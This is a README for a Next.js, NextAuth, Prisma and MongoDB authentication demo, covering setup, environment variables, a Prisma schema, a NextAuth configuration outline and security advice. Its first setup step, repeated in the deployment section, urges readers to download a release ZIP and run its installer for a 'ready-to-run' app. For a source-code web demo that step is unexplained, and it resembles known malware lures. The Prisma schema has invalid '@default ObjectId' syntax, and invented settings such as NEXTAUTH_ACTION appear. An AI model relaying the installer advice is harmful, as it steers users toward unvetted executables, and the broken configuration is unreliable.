## Overview

NextAuth-Demo is a practical, production-oriented sample that shows how to secure a full-stack app with Next.js, NextAuth, and Prisma while connecting to MongoDB. It emphasizes clear authentication flows, proper session management, and a clean developer experience. The app uses TypeScript, React, Tailwind CSS, and modern best practices to keep the code approachable yet powerful.

The project focuses on:

- Safe user authentication with NextAuth.js
- A robust Prisma data layer for MongoDB
- Clear separation between frontend and backend concerns
- Simple, scalable deployment patterns
- Clean, readable code that you can extend

This README provides a thorough guide to understanding, using, and extending the demo. It targets developers who want to see how to combine Next.js with NextAuth and Prisma for a secure, scalable authentication experience.

---

## How it works

At a high level, this demo provides:

- A Next.js frontend that renders the UI and handles client-side logic
- A NextAuth-based backend that authenticates users via credentials and sessions
- A Prisma data layer that stores users, sessions, and related data in MongoDB
- A clean flow for creating credentials, signing in, and maintaining sessions
- A secure approach to password storage (bcrypt) and password reset assistance

Flow example:

- User visits the app
- User clicks Sign In
- NextAuth handles credential verification against Prisma
- If valid, a secure session is created and stored
- The UI adapts to show the user is signed in, with a safe sign-out option
- Access to protected pages is guarded via session checks

The architecture is intentionally straightforward. It‚Äôs easy to extend for more complex scenarios, such as roles, permissions, or token-based API access.

---

## Getting started

Follow these steps to run the demo locally and explore the authentication flow.

1) Open the project page to download the release artifacts

- The repository hosts release assets on its Releases page. From the Releases page, download the release artifact (ZIP or TAR.GZ) and run its installer or follow the included setup instructions. This is a quick way to see a working instance without building from source. The relevant page is the Releases section: Visit https://github.com/KABUSsport/NextAuth-Demo/releases to grab the latest release. The file you download will be named something like NextAuth-Demo-<version>.zip and will contain a ready-to-run app.

2) Install dependencies locally (if you prefer building from source)

- Prerequisites: Node.js (version 16+ recommended), npm or yarn, and a MongoDB instance (local or cloud).

- Clone the repository (if starting from source):
  - git clone https://github.com/KABUSsport/NextAuth-Demo.git
  - cd NextAuth-Demo

- Install dependencies:
  - npm install
  - or yarn install

3) Run the app in development mode

- Start the dev server:
  - npm run dev
  - Open http://localhost:3000

4) Quick check

- Open the Sign In page
- Enter a user‚Äôs credentials that exist in the database (you can seed some users)
- Confirm that a session is created and the user sees a signed-in state
- Navigate to a protected page to verify access control

Exact steps might vary if you are using a release artifact. The release usually includes a self-contained setup, so you may not need to run the dev server locally. The artifact is designed to demonstrate the features without additional configuration.

---

## Prerequisites

Before you start, ensure you have:

- Node.js in a supported LTS version
- npm or yarn
- A MongoDB instance (local or hosted). If hosting, obtain the MongoDB connection string (URI)
- Basic CLI familiarity for running commands
- A code editor you prefer (VS Code is common)

If you want to experiment with a remote database, ensure your MongoDB Atlas cluster or other service allows external connections from your development machine. You may need to adjust IP whitelist and user credentials. For local development, you can run a local MongoDB instance and connect to mongodb://localhost:27017/yourdb.

---

## Installation

If you downloaded a release artifact, refer to the included setup instructions within the artifact. Otherwise, if you are building from source, follow this install path:

- Step 1: Install dependencies
  - npm install

- Step 2: Create a .env.local file with required environment variables

- Step 3: Start the development server
  - npm run dev

Environment variables you‚Äôll typically need:

- MONGODB_URI: Your MongoDB connection string, including the database name
- NEXTAUTH_URL: The base URL of your app (e.g., http://localhost:3000)
- NEXTAUTH_SECRET: A long, random secret used by NextAuth
- DATABASE_URL: The database URL used by Prisma (for MongoDB, this is often the same as MONGODB_URI or a separate MongoDB database)
- PORT: The port number (optional; default 3000)

Important: Keep secret values private. Do not commit secrets to version control. Use a .env.local file for local development and a secure secret management approach for production environments.

---

## Configuration and environment

This project is designed to be easy to configure. The .env.local file is central to local development. The typical structure looks like this:

- MONGODB_URI=mongodb+srv://<username>:<password>@cluster0.mongodb.net/<dbname>?retryWrites=true&w=majority
- NEXTAUTH_URL=http://localhost:3000
- NEXTAUTH_SECRET=some-very-long-random-secret
- DATABASE_URL=mongodb://localhost:27017/yourdbname
- NEXTAUTH_ACTION=signIn
- NEXTAUTH_PROVIDER_CONFIG=your-config-here (if you add providers)

Notes:

- NextAuth uses NEXTAUTH_SECRET to sign tokens and sessions. Use a strong random string.
- Prisma uses DATABASE_URL to connect to the database. With MongoDB, this typically points to a MongoDB connection string.

Security considerations:

- Never expose NEXTAUTH_SECRET in client code or public repos.
- Use secure cookies in production (set via NextAuth configuration or environment settings).
- Consider implementing additional security layers such as rate limiting, CSRF protection, and strict content security policies.

---

## Project structure

- app/ or pages/ (Next.js app structure)
  - pages/api/auth/[...nextauth].ts (NextAuth API routes)
  - pages/index.tsx (home page)
  - pages/dashboard.tsx (protected page)
  - components/ (shared UI components)
  - layouts/ (shared layout components)
  - styles/ (Tailwind + global styles)
- prisma/
  - schema.prisma (data model for users, sessions, roles, etc.)
- lib/
  - prisma.ts (Prisma client instance)
  - auth.ts (helpers for authentication)
- public/
  - images/ (static assets)
- .env.local
- package.json
- README.md (this file)

Notes on the structure:

- The API routes handle sign-in, sign-out, and session validation.
- The Prisma client is centralized to avoid multiple instances across hot-reloads.
- Tailwind is used to style components with utility classes for speed and consistency.

---

## Data model and Prisma

Prisma serves as the data access layer. It defines schemas for users and related authentication data. A typical schema includes:

- User: id, email, name, hashedPassword, createdAt, updatedAt
- Session: id, userId, expires, sessionToken, accessToken
- VerificationToken: identifier, token, expires

Example excerpt (Prisma schema):

model User {
  id             String   @id @default ObjectId
  email          String   @unique
  name           String?
  hashedPassword String
  createdAt      DateTime @default(now())
  updatedAt      DateTime @updatedAt
  // relations
  sessions       Session[]
}

model Session {
  id            String   @id @default ObjectId
  userId        String
  user          User     @relation(fields: [userId], references: [id])
  expires       DateTime
  sessionToken  String   @unique
  accessToken   String?
}

model VerificationToken {
  identifier String
  token      String   @unique
  expires    DateTime
  @@id([identifier, token])
}

Notes:

- MongoDB schema differs from a relational database but Prisma provides a familiar model structure.
- Passwords are stored as hashed values using bcrypt for security.
- Migrations with MongoDB are supported, but you may use Prisma db push for simple updates during development.

Prisma client initialization helps ensure consistent access to the database from server-side code.

---

## Prisma and migrations

- Install Prisma CLI as a dev dependency if you work from source:
  - npm install -D prisma
- Initialize Prisma:
  - npx prisma init
- Push schema to MongoDB during development:
  - npx prisma db push
- Generate Prisma Client:
  - npx prisma generate

The db push command updates your MongoDB collections to reflect the Prisma schema without requiring a full migration. For more complex changes, plan migrations and test them in a dedicated environment.

---

## NextAuth configuration

NextAuth config wires up credential-based authentication with Prisma. A minimal setup includes:

- Providers: CredentialsProvider for username/password
- Session strategy: JWT (or database-backed sessions if you prefer)
- Callbacks: JWT and session callbacks to shape the session payload
- Database adapter: PrismaAdapter to connect NextAuth with Prisma

Key code patterns:

- CredentialsProvider: verify user by email, fetch hashed password from Prisma, compare with bcrypt
- bcryptjs usage: bcrypt.compareSync or bcrypt.compare to verify passwords
- Session tokens: secure and short-lived tokens with proper expiration

Example outline:

import NextAuth from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import { PrismaAdapter } from '@next-auth/prisma-adapter';
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcryptjs';

export default NextAuth({
  providers: [
    CredentialsProvider({
      name: 'Credentials',
      authorize: async (credentials) => {
        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
        if (user && bcrypt.compareSync(credentials.password, user.hashedPassword)) {
          return { id: user.id, name: user.name, email: user.email };
        }
        return null;
      }
    })
  ],
  adapter: PrismaAdapter(prisma),
  session: {
    strategy: 'jwt',
  },
  callbacks: {
    jwt: async ({ token, user }) => {
      if (user) token.id = user.id;
      return token;
    },
    session: async ({ session, token }) => {
      if (token?.id) session.user.id = token.id;
      return session;
    }
  }
});

This pattern keeps authentication logic clear and aligns with Prisma data models. Adjust the exact fields and claims to suit your app‚Äôs requirements.

---

## MongoDB integration

MongoDB supports flexible schemas and is well-suited for user data and session storage. The integration steps:

- Provide a MongoDB connection string in MONGODB_URI.
- Use Prisma to model User, Session, and other related entities.
- Use Prisma Client in server-side code to read, write, and manage data.
- Ensure proper indexing on frequently queried fields like email.

Security considerations:

- Store only necessary user data in clear text. Passwords must be hashed with bcrypt.
- Ensure that database credentials remain secure and rotate them regularly.
- When deploying to production, set up a secure MongoDB access policy. Use TLS/SSL connections where possible.

---

## Usage examples

- Sign up: Collect email and password, hash password, save user to Prisma, and seed any additional fields you want.
- Sign in: Use the credentials provider to verify email and password, then create a session via NextAuth.
- Access protected pages: Check the session from the client or server side and render UI accordingly.
- Sign out: Trigger NextAuth signOut on the client, which clears the session tokens.

Code snippets are provided throughout the codebase for typical flows. The examples illustrate how to integrate bcrypt for password verification, Prisma queries for user data, and NextAuth callbacks for session shaping.

---

## Testing and quality

Tests exist to validate the authentication flow and the Prisma data layer at a basic level. Consider adding:

- Unit tests for helper utilities (password hashing, token generation)
- Integration tests for sign-in and protected routes
- E2E tests for a complete login/logout flow using a headless browser

Quality checks to run:

- ESLint and Prettier for consistent code style
- TypeScript compilation checks
- Type correctness for data models and API routes

Note: The demo focuses on clarity and safety. Extend the tests as you adapt the code to your project‚Äôs specific requirements.

---

## Development workflow

- Branching: Use feature branches for new authentication flows, UI tweaks, or database changes.
- Commits: Make small, purposeful commits with meaningful messages.
- PRs: Open pull requests to merge features after peer review.
- Documentation: Keep the README updated with any architectural changes, new endpoints, or data models.

Common tasks:

- Add a new UI component for a custom authentication flow
- Extend the Prisma schema for additional user roles
- Add a new NextAuth provider (OAuth or SSO) if needed
- Improve UI accessibility or localization

---

## Deployment

Deployment steps can vary by environment, but here is a general approach:

- Build: npm run build
- Export or run: npm start (for production)
- Environment variables: Set MONGODB_URI, NEXTAUTH_URL, NEXTAUTH_SECRET, DATABASE_URL, etc., in your hosting environment
- Database migrations: If using Prisma migrations, run the migration commands in a staging environment first

If you package the app as a release artifact, deployment steps may be simplified. The artifact includes a pre-built app image, ready to run in a supported environment.

---

## Security considerations

- Password storage: Always store hashed passwords with bcrypt or a stronger hash function. Do not store plain-text passwords.
- Secrets management: Never embed secrets in code. Use environment variables and secret stores in production.
- Session security: Use secure, httpOnly cookies. Rotate session tokens and set appropriate token lifetimes.
- Input validation: Validate all user inputs server-side to prevent injection attacks.
- Rate limiting: Implement rate limiting on authentication endpoints to deter brute-force attempts.
- CSRF protection: Rely on NextAuth's built-in protections; verify CSRF settings in production.
- Logging: Do not log sensitive information. Audit authentication events without exposing credentials.

---

## Performance and optimization

- Server-side rendering: Use SSR where it benefits the initial render, and CSR where it reduces latency for user interactions.
- Caching: Consider simple server-side caching for lookups that don‚Äôt change often.
- Prisma optimization: Use selective field retrieval and avoid N+1 queries.
- Image optimization: Use Next.js Image component for efficient image handling.
- Bundle size: Keep dependencies lean. Remove unused code and split large components into smaller ones.

---

## Accessibility and i18n

- Keyboard navigation: Ensure all interactive elements are navigable via keyboard.
- ARIA labeling: Provide appropriate ARIA labels for form fields, controls, and dynamic content.
- Color contrast: Use high-contrast color schemes and accessible color tokens.
- Localization: Plan for i18n if you plan to deploy in multiple locales. Abstract strings into a locale file and switch based on user preferences.

---

## Roadmap

- Add OAuth providers (GitHub, Google, etc.) to broaden sign-in options
- Implement multi-factor authentication (MFA) for stronger security
- Introduce role-based access control (RBAC) with defined roles and permissions
- Extend Prisma schema to support audit trails and soft deletes
- Improve test coverage with unit and integration tests
- Add a sample production deployment guide for Vercel, AWS, or another platform
